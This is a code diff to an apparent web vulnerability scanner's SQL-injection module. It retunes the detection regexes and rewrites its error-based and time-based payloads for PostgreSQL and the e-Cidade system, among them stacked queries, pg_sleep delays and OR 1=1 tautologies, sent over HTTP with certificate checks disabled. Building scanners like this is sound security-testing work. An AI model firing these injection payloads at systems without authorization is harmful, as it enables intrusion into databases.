@@ -21,6 +21,8 @@ class SqlInjectionModule(IScanModule):
         r"(?i)postgresql.*error",
         r"(?i)syntax error at or near",
         r"(?i)unterminated quoted string",
+        r"(?i)division by zero",
+        r"(?i)invalid input syntax for (?:type )?integer",
         r"(?i)pg_query",
         r"(?i)pg_exec",
         r"(?i)pg_",
@@ -50,28 +52,28 @@ class SqlInjectionModule(IScanModule):
 
         session = requests.Session()
         session.verify = False
-        session.timeout = 5
+        session.timeout = 7
 
         original_value = str(injection_point.get('original_value', ''))
         is_numeric = self._is_numeric(original_value)
+        num_val = original_value if is_numeric else "1"
 
-        # Error-based payloads. Numeric payloads matter for legacy e-Cidade SQL
-        # such as "campo = {$valor}" where quotes are not present in SQL.
+        # Error-based payloads
+        # Inclui testes com aspas e testes numéricos livres de aspas (especiais para PostgreSQL / E-cidade)
         error_payloads = [
             "'",
             '"',
             "'-- ",
             "\")",
             "' OR '1'='1'-- ",
-            '" OR "1"="1"-- ',
+            f"{num_val}/0",
+            f"{num_val}); SELECT 1/0; -- ",
+            f"{num_val} AND 1=CAST(chr(118)||chr(117)||chr(108)||chr(110) AS integer)",
+            f"{num_val}) OR 1=1-- ",
+            f"{num_val} OR 1=1-- ",
         ]
         if is_numeric:
-            error_payloads = [
-                f"{original_value}'",
-                f"{original_value} OR 1=1-- ",
-                f"{original_value}) OR 1=1-- ",
-                f"{original_value} AND 1=CONVERT(int,'x')-- ",
-            ] + error_payloads
+            error_payloads = [f"{original_value}'"] + error_payloads
 
         for payload in error_payloads:
             try:
@@ -102,21 +104,22 @@ class SqlInjectionModule(IScanModule):
         if boolean_vuln:
             return [boolean_vuln]
 
-        # Time-based payloads
+        # Time-based payloads especializados para PostgreSQL / PHP (pg_query) e E-cidade
+        # 1. Subconsultas em inteiros (funciona em argumentos de função fc_*, WHERE id = ..., etc.)
+        # 2. Stacked queries com e sem fechamento de parênteses (nativas no pg_query do PHP)
+        # 3. Injeções em strings e fallback MySQL
         time_payloads = [
-            "' AND SLEEP(3)-- ",
-            "' OR SLEEP(3)-- ",
-            '" AND SLEEP(3)-- ',
-            "' AND pg_sleep(3)-- ",
-            "' AND BENCHMARK(3000000,MD5(1))-- ",
+            f"{num_val} + (SELECT 0 FROM pg_sleep(3))",
+            f"(SELECT {num_val} FROM pg_sleep(3))",
+            f"{num_val}); SELECT pg_sleep(3); -- ",
+            f"{num_val}; SELECT pg_sleep(3); -- ",
+            f"{num_val}) as x; SELECT pg_sleep(3); -- ",
+            f"{original_value}' AND 1=(SELECT 1 FROM pg_sleep(3))-- ",
+            f"{original_value}'; SELECT pg_sleep(3); -- ",
+            f"{original_value}' OR 1=(SELECT 1 FROM pg_sleep(3))-- ",
+            f"'{original_value}'; SELECT pg_sleep(3); -- ",
+            f"{original_value}' AND SLEEP(3)-- ",
         ]
-        if is_numeric:
-            time_payloads = [
-                f"{original_value} AND SLEEP(3)-- ",
-                f"{original_value} OR SLEEP(3)-- ",
-                f"{original_value} AND pg_sleep(3)-- ",
-                f"{original_value} OR pg_sleep(3)-- ",
-            ] + time_payloads
 
         for payload in time_payloads:
             try:
@@ -130,7 +133,7 @@ class SqlInjectionModule(IScanModule):
                             name="SQL Injection (Time-Based)",
                             severity="High",
                             description=(
-                                "Possivel SQL Injection por atraso na resposta. "
+                                "SQL Injection detectada por atraso na resposta via PostgreSQL pg_sleep. "
                                 f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                             ),
                             evidence=f"Payload: {payload} | Delay: {elapsed:.2f}s",
